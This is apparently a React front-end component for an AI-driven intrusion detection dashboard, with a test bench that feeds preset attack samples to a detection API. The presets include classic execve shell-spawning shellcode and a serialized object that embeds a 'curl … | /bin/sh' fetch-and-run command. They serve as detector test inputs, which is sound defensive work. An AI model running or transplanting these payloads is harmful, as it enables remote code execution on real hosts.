'use client';

import { useState, useEffect, useCallback } from 'react';
import { api } from '@/lib/api';

const ZERO_DAY_PRESETS = [
  {
    name: '1. Raw Polymorphic Shellcode (Zero Keywords)',
    desc: 'Unlabelled binary opcodes with high non-printable byte density and high entropy. No known CVE or keyword strings.',
    src_ip: '193.142.58.19',
    dst_ip: '10.0.1.45',
    dst_port: 445,
    protocol: 'TCP',
    signature: 'Raw Ingress Binary Stream [Novel Execution Vector]',
    category: 'unknown_exploit',
    severity: 'CRITICAL',
    risk_score: 95,
    payload: '\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80',
  },
  {
    name: '2. Unseen Deserialization Zero-Day (Deep Structural Nesting)',
    desc: 'Complex object serialization with extreme structural delimiter density and nested control characters.',
    src_ip: '45.154.255.88',
    dst_ip: '10.0.2.14',
    dst_port: 8080,
    protocol: 'TCP/HTTP',
    signature: 'Custom HTTP Request Body [Anomalous Serialization Tree]',
    category: 'deserialization_anomaly',
    severity: 'HIGH',
    risk_score: 90,
    payload: 'O:8:"Exploit":2:{s:4:"cmd";s:28:"/usr/bin/python3 -c import...";s:4:"args";a:3:{i:0;s:2:"-c";i:1;s:18:"curl -sL 193.142";i:2;s:7:"| /bin/sh";};s:5:"chain";a:2:{i:0;O:10:"ClassProxy":1:{s:6:"target";s:12:"KernelRunner";};i:1;b:1;};}',
  },
  {
    name: '3. Polymorphic Encrypted C2 Beacon (High-Entropy Noise)',
    desc: 'Hex-encoded random high-entropy stream mimicking compressed telemetry without recognizable protocol headers.',
    src_ip: '185.220.101.5',
    dst_ip: '10.0.1.99',
    dst_port: 8443,
    protocol: 'TCP/TLS',
    signature: 'Opaque Ingress Flow [Statistically Aberrant Distribution]',
    category: 'encrypted_traffic',
    severity: 'CRITICAL',
    risk_score: 92,
    payload: '7e4b9a2f1c8d0e3b5a7c9e1f3a5b7d9f2e4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a',
  },
  {
    name: '4. Benign Operational Telemetry (Clean Baseline)',
    desc: 'Standard JSON API heartbeat request. Shannon entropy ~3.6, zero binary opcodes, normal delimiter distribution.',
    src_ip: '10.0.0.12',
    dst_ip: '10.0.0.1',
    dst_port: 443,
    protocol: 'TCP/HTTPS',
    signature: 'Node Heartbeat Ping: cluster-node-alpha status=OK',
    category: 'system_telemetry',
    severity: 'LOW',
    risk_score: 10,
    payload: '{"service":"node-agent","status":"healthy","uptime_seconds":86400,"memory_usage_pct":42.1,"disk_free_gb":184}',
  },
];

export default function AIPredictorCard() {
  const [forecast, setForecast] = useState(null);
  const [loading, setLoading] = useState(true);
  const [evaluating, setEvaluating] = useState(false);
  const [ingesting, setIngesting] = useState(false);
  const [testResult, setTestResult] = useState(null);
  const [showTestbench, setShowTestbench] = useState(true);
  const [activePreset, setActivePreset] = useState(0);

  // Testbench Form State
  const [customSrcIp, setCustomSrcIp] = useState(ZERO_DAY_PRESETS[0].src_ip);
  const [customDstPort, setCustomDstPort] = useState(ZERO_DAY_PRESETS[0].dst_port);
  const [customSignature, setCustomSignature] = useState(ZERO_DAY_PRESETS[0].signature);
  const [customPayload, setCustomPayload] = useState(ZERO_DAY_PRESETS[0].payload);

  const fetchForecast = useCallback(async (isInitial = false) => {
    try {
      if (isInitial) setLoading(true);
      const data = await api.getAIForecast();
      setForecast(data);
    } catch (err) {
      console.error('Failed to load AI threat forecast:', err);
    } finally {
      if (isInitial) setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchForecast(true);
    const interval = setInterval(() => fetchForecast(false), 30000);
    return () => clearInterval(interval);
  }, [fetchForecast]);

  const selectPreset = (idx) => {
    setActivePreset(idx);
    const p = ZERO_DAY_PRESETS[idx];
    setCustomSrcIp(p.src_ip);
    setCustomDstPort(p.dst_port);
    setCustomSignature(p.signature);
    setCustomPayload(p.payload);
    setTestResult(null);
  };

  // 1. Evaluate Multi-Vector AI (Inference Only)
  const handleEvaluateAI = async () => {
    try {
      setEvaluating(true);
      const body = {
        src_ip: customSrcIp,
        dst_ip: '10.0.1.5',
        dst_port: parseInt(customDstPort, 10) || 443,
        protocol: 'TCP',
        signature: customSignature,
        category: 'zero_day_telemetry',
        severity: 'CRITICAL',
        risk_score: 90,
        raw_event: {
          payload: customPayload,
          packet_hex: customPayload,
          data: customPayload,
        },
      };
      const res = await api.predictThreat(body);
      setTestResult({ ...res, mode: 'INFERENCE_PREVIEW' });
      await fetchForecast();
    } catch (err) {
      alert(`AI Evaluation error: ${err.message}`);
    } finally {
      setEvaluating(false);
    }
  };

  // 2. Autonomous Sever & Ingest (Live Defense Pipeline)
  const handleIngestAndSever = async () => {
    try {
      setIngesting(true);
      const alertPayload = {
        src_ip: customSrcIp,
        dst_ip: '10.0.1.5',
        dst_port: parseInt(customDstPort, 10) || 443,
        protocol: 'TCP',
        signature: customSignature,
        category: 'zero_day_telemetry',
        severity: 'CRITICAL',
        risk_score: 95,
        raw_event: {
          payload: customPayload,
          packet_hex: customPayload,
          data: customPayload,
          zero_day_test: true,
        },
      };
      const res = await api.createAlert(alertPayload);
      setTestResult({
        ...(res.ai_evaluation || {}),
        mitigation: res.autonomous_mitigation,
        alert_status: res.alert?.status,
        mode: 'LIVE_SEVERANCE_ENFORCED',
      });
      await fetchForecast();
    } catch (err) {
      alert(`Autonomous Severance error: ${err.message}`);
    } finally {
      setIngesting(false);
    }
  };

  const threatLevel = forecast?.global_ai_threat_level || 'NORMAL';
  const anomalyScore = forecast?.average_anomaly_score ?? 0.18;
  const isElevated = threatLevel === 'ELEVATED' || anomalyScore >= 0.5;

  return (
    <div
      className="glass-card"
      style={{
        position: 'relative',
        overflow: 'hidden',
        border: isElevated ? '1px solid rgba(239, 68, 68, 0.4)' : '1px solid rgba(59, 130, 246, 0.25)',
        background: 'linear-gradient(135deg, rgba(15, 23, 42, 0.85) 0%, rgba(30, 41, 59, 0.6) 100%)',
        boxShadow: isElevated ? '0 0 25px rgba(239, 68, 68, 0.15)' : '0 0 20px rgba(59, 130, 246, 0.1)',
        padding: 24,
      }}
    >
      {/* Background ambient neon glow */}
      <div
        style={{
          position: 'absolute',
          top: -40,
          right: -40,
          width: 160,
          height: 160,
          borderRadius: '50%',
          background: isElevated
            ? 'radial-gradient(circle, rgba(239, 68, 68, 0.25) 0%, transparent 70%)'
            : 'radial-gradient(circle, rgba(99, 102, 241, 0.22) 0%, transparent 70%)',
          filter: 'blur(24px)',
          pointerEvents: 'none',
        }}
      />

      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 18, flexWrap: 'wrap', gap: 12 }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
            <span style={{ fontSize: '1.25rem' }}>⚡</span>
            <h3 style={{ margin: 0, fontSize: '1.05rem', fontWeight: 800, letterSpacing: '0.04em', textTransform: 'uppercase' }}>
              AEGIS-X Autonomous AI/ML Threat Engine
            </h3>
            <span
              style={{
                fontSize: '0.65rem',
                fontWeight: 800,
                padding: '2px 8px',
                borderRadius: 4,
                background: 'rgba(139, 92, 246, 0.2)',
                border: '1px solid #8b5cf6',
                color: '#c4b5fd',
                letterSpacing: '0.08em',
              }}
            >
              MULTI-VECTOR NEURAL PROFILER
            </span>
            <span
              style={{
                fontSize: '0.65rem',
                fontWeight: 700,
                padding: '2px 8px',
                borderRadius: 4,
                background: 'rgba(16, 185, 129, 0.15)',
                border: '1px solid rgba(16, 185, 129, 0.4)',
                color: '#34d399',
              }}
            >
              ACTIVE ONLINE LEARNING (ZERO CODE RE-WRITES)
            </span>
          </div>
          <p style={{ margin: '4px 0 0 0', fontSize: '0.8rem', color: 'var(--text-muted)' }}>
            Mathematical entropy analysis, byte variance, structural delimiter perplexity & automated wirespeed hardware IPS mitigation
          </p>
        </div>

        <div style={{ display: 'flex', gap: 8 }}>
          <button
            onClick={() => setShowTestbench(!showTestbench)}
            className="btn btn-sm"
            style={{
              fontSize: '0.75rem',
              padding: '5px 12px',
              background: showTestbench ? 'rgba(59, 130, 246, 0.2)' : 'rgba(255, 255, 255, 0.05)',
              border: '1px solid rgba(59, 130, 246, 0.4)',
              color: '#93c5fd',
            }}
          >
            {showTestbench ? '▼ Hide Zero-Day Lab' : '▲ Open Zero-Day Lab'}
          </button>
          <button
            onClick={fetchForecast}
            disabled={loading}
            className="btn btn-ghost btn-sm"
            style={{ fontSize: '0.75rem', padding: '5px 10px' }}
            title="Refresh Inferences"
          >
            {loading ? '⟳ Refreshing...' : '⟳ Sync'}
          </button>
        </div>
      </div>

      {/* Primary KPI Gauges */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(170px, 1fr))', gap: 14, marginBottom: 18 }}>
        {/* Threat Level */}
        <div style={{ background: 'rgba(0, 0, 0, 0.35)', padding: '12px 14px', borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.06)' }}>
          <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Threat Level Forecast</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 4 }}>
            <span
              style={{
                width: 10,
                height: 10,
                borderRadius: '50%',
                background: isElevated ? '#ef4444' : '#10b981',
                boxShadow: isElevated ? '0 0 10px #ef4444' : '0 0 10px #10b981',
              }}
            />
            <span style={{ fontSize: '1.15rem', fontWeight: 800, color: isElevated ? '#f87171' : '#34d399' }}>
              {threatLevel}
            </span>
          </div>
        </div>

        {/* Anomaly Score Bar */}
        <div style={{ background: 'rgba(0, 0, 0, 0.35)', padding: '12px 14px', borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.06)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
            <span>Telemetry Anomaly Index</span>
            <span style={{ fontWeight: 700, color: anomalyScore > 0.6 ? '#f87171' : '#60a5fa' }}>{Math.round(anomalyScore * 100)}%</span>
          </div>
          <div style={{ marginTop: 8, height: 8, borderRadius: 4, background: 'rgba(255,255,255,0.08)', overflow: 'hidden' }}>
            <div
              style={{
                height: '100%',
                width: `${Math.min(100, Math.max(8, anomalyScore * 100))}%`,
                borderRadius: 4,
                background: anomalyScore > 0.6
                  ? 'linear-gradient(90deg, #f59e0b 0%, #ef4444 100%)'
                  : 'linear-gradient(90deg, #3b82f6 0%, #8b5cf6 100%)',
                transition: 'width 0.4s ease',
              }}
            />
          </div>
        </div>

        {/* Quarantined / High-Risk Machines */}
        <div style={{ background: 'rgba(0, 0, 0, 0.35)', padding: '12px 14px', borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.06)' }}>
          <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Compromised Endpoints</div>
          <div style={{ display: 'flex', alignItems: 'baseline', gap: 6, marginTop: 4 }}>
            <span style={{ fontSize: '1.2rem', fontWeight: 800, color: (forecast?.isolated_machines_count || 0) > 0 ? '#f87171' : 'var(--text-primary)' }}>
              {forecast?.isolated_machines_count || 0}
            </span>
            <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
              Isolated ({forecast?.high_risk_hosts?.length || 0} High Risk)
            </span>
          </div>
        </div>

        {/* Autonomous Mitigation Mode */}
        <div style={{ background: 'rgba(0, 0, 0, 0.35)', padding: '12px 14px', borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.06)' }}>
          <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Autonomous Mitigation</div>
          <div style={{ marginTop: 4, fontSize: '0.85rem', fontWeight: 700, color: '#38bdf8', display: 'flex', alignItems: 'center', gap: 6 }}>
            <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#38bdf8', boxShadow: '0 0 8px #38bdf8' }} />
            IPS Hardware Sever: ACTIVE
          </div>
        </div>
      </div>

      {/* Multi-Vector Mathematical Profiler Overview Banner */}
      <div
        style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))',
          gap: 10,
          marginBottom: 18,
          background: 'rgba(0, 0, 0, 0.25)',
          padding: '10px 14px',
          borderRadius: 8,
          border: '1px dashed rgba(255, 255, 255, 0.1)',
        }}
      >
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Shannon Entropy: </span>
          <b style={{ color: '#a78bfa' }}>H(X) ≤ 8.0 bits</b>
        </div>
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Byte Variance: </span>
          <b style={{ color: '#60a5fa' }}>σ² Dispersion</b>
        </div>
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Non-Printable Density: </span>
          <b style={{ color: '#f472b6' }}>Shellcode Ratio</b>
        </div>
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Delimiter Structure: </span>
          <b style={{ color: '#34d399' }}>Nesting Depth</b>
        </div>
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Trigram Rarity: </span>
          <b style={{ color: '#fbbf24' }}>Perplexity</b>
        </div>
        <div style={{ fontSize: '0.72rem' }}>
          <span style={{ color: 'var(--text-muted)' }}>Velocity Z-Score: </span>
          <b style={{ color: '#f87171' }}>Burst Outlier</b>
        </div>
      </div>

      {/* ── INTERACTIVE ZERO-DAY / NOVEL ATTACK TESTBENCH ─────────── */}
      {showTestbench && (
        <div
          style={{
            marginBottom: 20,
            background: 'rgba(15, 23, 42, 0.95)',
            border: '1px solid rgba(99, 102, 241, 0.35)',
            borderRadius: 10,
            padding: 16,
            boxShadow: 'inset 0 0 20px rgba(99, 102, 241, 0.08)',
          }}
        >
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                <span style={{ color: '#818cf8', fontWeight: 800 }}>✦ ZERO-DAY NOVEL ATTACK PLAYGROUND</span>
                <span style={{ fontSize: '0.68rem', color: '#a5b4fc', background: 'rgba(99, 102, 241, 0.2)', padding: '2px 6px', borderRadius: 4 }}>
                  Zero Hardcoded Keywords Required
                </span>
              </div>
              <p style={{ margin: '2px 0 0 0', fontSize: '0.76rem', color: 'var(--text-muted)' }}>
                Test any arbitrary, unseen or obfuscated payload. AEGIS-X extracts statistical vectors, compares against its adaptive baseline, and auto-severs the IP.
              </p>
            </div>
          </div>

          {/* Preset Attack Buttons */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: 8, marginBottom: 14 }}>
            {ZERO_DAY_PRESETS.map((preset, idx) => (
              <button
                key={idx}
                onClick={() => selectPreset(idx)}
                style={{
                  textAlign: 'left',
                  padding: '8px 10px',
                  borderRadius: 6,
                  border: activePreset === idx ? '1px solid #6366f1' : '1px solid rgba(255, 255, 255, 0.08)',
                  background: activePreset === idx ? 'rgba(99, 102, 241, 0.22)' : 'rgba(255, 255, 255, 0.02)',
                  color: activePreset === idx ? '#e0e7ff' : 'var(--text-secondary)',
                  cursor: 'pointer',
                  fontSize: '0.75rem',
                  transition: 'all 0.15s ease',
                }}
              >
                <div style={{ fontWeight: 700 }}>{preset.name}</div>
                <div style={{ fontSize: '0.68rem', color: 'var(--text-muted)', marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                  {preset.desc}
                </div>
              </button>
            ))}
          </div>

          {/* Payload Configuration Input Row */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 120px', gap: 10, marginBottom: 10 }}>
            <div>
              <label style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Attacker Source IP</label>
              <input
                type="text"
                value={customSrcIp}
                onChange={(e) => setCustomSrcIp(e.target.value)}
                style={{
                  width: '100%',
                  marginTop: 4,
                  padding: '6px 10px',
                  background: 'rgba(0, 0, 0, 0.4)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: 6,
                  color: '#fff',
                  fontFamily: 'monospace',
                  fontSize: '0.8rem',
                }}
              />
            </div>
            <div>
              <label style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>Target Port</label>
              <input
                type="number"
                value={customDstPort}
                onChange={(e) => setCustomDstPort(e.target.value)}
                style={{
                  width: '100%',
                  marginTop: 4,
                  padding: '6px 10px',
                  background: 'rgba(0, 0, 0, 0.4)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: 6,
                  color: '#fff',
                  fontFamily: 'monospace',
                  fontSize: '0.8rem',
                }}
              />
            </div>
          </div>

          {/* Raw Payload Text Area */}
          <div style={{ marginBottom: 12 }}>
            <label style={{ fontSize: '0.7rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
              Raw Ingress Payload / Binary Hex Stream
            </label>
            <textarea
              rows={3}
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              placeholder="Paste raw shellcode, serialized tree, or obfuscated hex string..."
              style={{
                width: '100%',
                marginTop: 4,
                padding: '8px 10px',
                background: 'rgba(0, 0, 0, 0.5)',
                border: '1px solid rgba(255, 255, 255, 0.12)',
                borderRadius: 6,
                color: '#34d399',
                fontFamily: 'monospace',
                fontSize: '0.75rem',
                resize: 'vertical',
              }}
            />
          </div>

          {/* Action Trigger Buttons */}
          <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
            <button
              onClick={handleEvaluateAI}
              disabled={evaluating || ingesting}
              className="btn btn-sm"
              style={{
                padding: '7px 14px',
                background: 'rgba(99, 102, 241, 0.25)',
                border: '1px solid #6366f1',
                color: '#c7d2fe',
                fontWeight: 700,
                fontSize: '0.78rem',
                cursor: 'pointer',
              }}
            >
              {evaluating ? 'Computing Vectors...' : '⚡ 1. Evaluate Multi-Vector AI (Inference)'}
            </button>
            <button
              onClick={handleIngestAndSever}
              disabled={evaluating || ingesting}
              className="btn btn-sm"
              style={{
                padding: '7px 16px',
                background: 'linear-gradient(135deg, #ef4444 0%, #b91c1c 100%)',
                border: 'none',
                color: '#fff',
                fontWeight: 800,
                fontSize: '0.78rem',
                boxShadow: '0 0 14px rgba(239, 68, 68, 0.4)',
                cursor: 'pointer',
              }}
            >
              {ingesting ? 'Severing Attacker...' : '🛑 2. Live Autonomous Severance & Ingest'}
            </button>
          </div>

          {/* Testbench Inference & Containment Receipt */}
          {testResult && (
            <div
              style={{
                marginTop: 16,
                padding: 14,
                background: testResult.anomaly_score >= 0.75 ? 'rgba(239, 68, 68, 0.08)' : 'rgba(16, 185, 129, 0.08)',
                border: `1px solid ${testResult.anomaly_score >= 0.75 ? 'rgba(239, 68, 68, 0.3)' : 'rgba(16, 185, 129, 0.3)'}`,
                borderRadius: 8,
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                <span style={{ fontSize: '0.82rem', fontWeight: 800, color: testResult.anomaly_score >= 0.75 ? '#fca5a5' : '#6ee7b7' }}>
                  {testResult.mode === 'LIVE_SEVERANCE_ENFORCED'
                    ? '🛡️ AUTONOMOUS CONTAINMENT ENFORCED AT WIRESPEED'
                    : '✦ MULTI-VECTOR AI INFERENCE ANALYSIS'}
                </span>
                <button
                  onClick={() => setTestResult(null)}
                  style={{ background: 'transparent', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', fontSize: '0.85rem' }}
                >
                  ✕
                </button>
              </div>

              {/* Statistical Vector Telemetry */}
              {testResult.ml_feature_vector && (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(110px, 1fr))', gap: 6, marginBottom: 10 }}>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Entropy H(X)</div>
                    <b style={{ color: '#a78bfa', fontSize: '0.85rem' }}>{testResult.ml_feature_vector.shannon_entropy}</b>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Variance σ²</div>
                    <b style={{ color: '#60a5fa', fontSize: '0.85rem' }}>{testResult.ml_feature_vector.byte_variance}</b>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Non-Printable</div>
                    <b style={{ color: '#f472b6', fontSize: '0.85rem' }}>{Math.round(testResult.ml_feature_vector.non_printable_density * 100)}%</b>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Delimiter Dens.</div>
                    <b style={{ color: '#34d399', fontSize: '0.85rem' }}>{Math.round(testResult.ml_feature_vector.delimiter_complexity * 100)}%</b>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Trigram Rarity</div>
                    <b style={{ color: '#fbbf24', fontSize: '0.85rem' }}>{testResult.ml_feature_vector.trigram_rarity}</b>
                  </div>
                  <div style={{ background: 'rgba(0,0,0,0.3)', padding: 6, borderRadius: 4, textAlign: 'center' }}>
                    <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>Velocity Z-Score</div>
                    <b style={{ color: '#f87171', fontSize: '0.85rem' }}>{testResult.ml_feature_vector.velocity_zscore}σ</b>
                  </div>
                </div>
              )}

              {/* Classification & Action Grid */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(160px, 1fr))', gap: 10, fontSize: '0.78rem', marginBottom: 8 }}>
                <div>
                  <span style={{ color: 'var(--text-muted)' }}>Classification: </span>
                  <b style={{ color: testResult.anomaly_score >= 0.75 ? '#f87171' : '#34d399' }}>{testResult.attack_family}</b>
                </div>
                <div>
                  <span style={{ color: 'var(--text-muted)' }}>Anomaly Probability: </span>
                  <b>{Math.round(testResult.anomaly_score * 100)}% (Confidence: {testResult.confidence_percentage ?? 95}%)</b>
                </div>
                <div>
                  <span style={{ color: 'var(--text-muted)' }}>Recommended Action: </span>
                  <b style={{ color: '#38bdf8' }}>{testResult.recommended_action}</b>
                </div>
                <div>
                  <span style={{ color: 'var(--text-muted)' }}>Mitigation Status: </span>
                  <b style={{ color: '#ef4444' }}>{testResult.mitigation?.action || (testResult.recommended_action === 'BLOCK_IP' ? 'PENDING_SEVER' : 'MONITORED')}</b>
                </div>
              </div>

              {/* Forecasted Next Stage */}
              {testResult.predicted_next_stage && (
                <div style={{ fontSize: '0.75rem', marginBottom: 8, padding: '6px 10px', background: 'rgba(0,0,0,0.2)', borderRadius: 4 }}>
                  <span style={{ color: 'var(--text-muted)' }}>Forecasted Next Attack Stage: </span>
                  <b style={{ color: '#fbbf24' }}>{testResult.predicted_next_stage}</b>
                </div>
              )}

              {/* Synthesized Suricata/Snort Hardware Drop Rule */}
              {testResult.synthesized_rule && (
                <div style={{ marginTop: 8, padding: '8px 10px', background: 'rgba(0,0,0,0.4)', borderRadius: 6, border: '1px solid rgba(255,255,255,0.06)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <span style={{ fontSize: '0.68rem', color: '#94a3b8', textTransform: 'uppercase', fontWeight: 700 }}>
                      ⚡ Synthesized Hardware/eBPF Firewall Drop Signature
                    </span>
                    <span style={{ fontSize: '0.65rem', color: '#34d399', background: 'rgba(16, 185, 129, 0.15)', padding: '1px 6px', borderRadius: 3 }}>
                      ACTIVE IN POSTGRES RULES ENGINE (SID: {testResult.synthesized_rule.sid})
                    </span>
                  </div>
                  <pre style={{ margin: 0, fontSize: '0.72rem', color: '#fca5a5', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                    {testResult.synthesized_rule.rule_syntax}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Trajectory & Strategic Recommendations */}
      {forecast?.recommendation && (
        <div
          style={{
            padding: '10px 14px',
            marginBottom: 16,
            borderRadius: 6,
            background: isElevated ? 'rgba(239, 68, 68, 0.12)' : 'rgba(59, 130, 246, 0.1)',
            borderLeft: `4px solid ${isElevated ? 'var(--sev-critical)' : 'var(--accent-primary)'}`,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ fontSize: '0.9rem' }}>🛡️</span>
            <span style={{ fontSize: '0.82rem', fontWeight: 600, color: 'var(--text-primary)' }}>
              {forecast.recommendation}
            </span>
          </div>
          {forecast?.high_risk_hosts?.length > 0 && (
            <span style={{ fontSize: '0.75rem', fontFamily: 'monospace', color: '#f87171' }}>
              Target: {forecast.high_risk_hosts.join(', ')}
            </span>
          )}
        </div>
      )}

      {/* Latest AI Neural Predictions Stream */}
      {forecast?.latest_predictions?.length > 0 && (
        <div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', textTransform: 'uppercase', marginBottom: 8, letterSpacing: '0.05em' }}>
            Live Stream: Evaluated Threat Trajectories & Machine Isolations
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
            {forecast.latest_predictions.map((p, idx) => (
              <div
                key={idx}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: '8px 12px',
                  background: 'rgba(255, 255, 255, 0.03)',
                  borderRadius: 6,
                  border: '1px solid rgba(255, 255, 255, 0.04)',
                  fontSize: '0.8rem',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                  <span
                    style={{
                      fontWeight: 700,
                      padding: '2px 6px',
                      borderRadius: 4,
                      background: p.anomaly_score > 0.8 ? 'rgba(239, 68, 68, 0.2)' : 'rgba(59, 130, 246, 0.2)',
                      color: p.anomaly_score > 0.8 ? '#f87171' : '#60a5fa',
                      fontSize: '0.7rem',
                    }}
                  >
                    {p.attack_family}
                  </span>
                  <span style={{ fontFamily: 'monospace', color: 'var(--text-secondary)' }}>
                    {p.compromised_host_ip}
                  </span>
                  <span style={{ color: 'var(--text-muted)', fontSize: '0.75rem' }}>
                    Next Phase: <b style={{ color: '#fbbf24' }}>{p.predicted_next_stage}</b>
                  </span>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                    Confidence: <b>{Math.round(p.confidence * 100)}%</b>
                  </span>
                  {p.auto_isolation_required ? (
                    <span style={{ color: '#f87171', fontWeight: 700, fontSize: '0.7rem', display: 'flex', alignItems: 'center', gap: 4 }}>
                      <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#ef4444' }}></span>
                      ISOLATION TRIGGERED
                    </span>
                  ) : (
                    <span style={{ color: '#34d399', fontSize: '0.7rem' }}>MONITORED</span>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
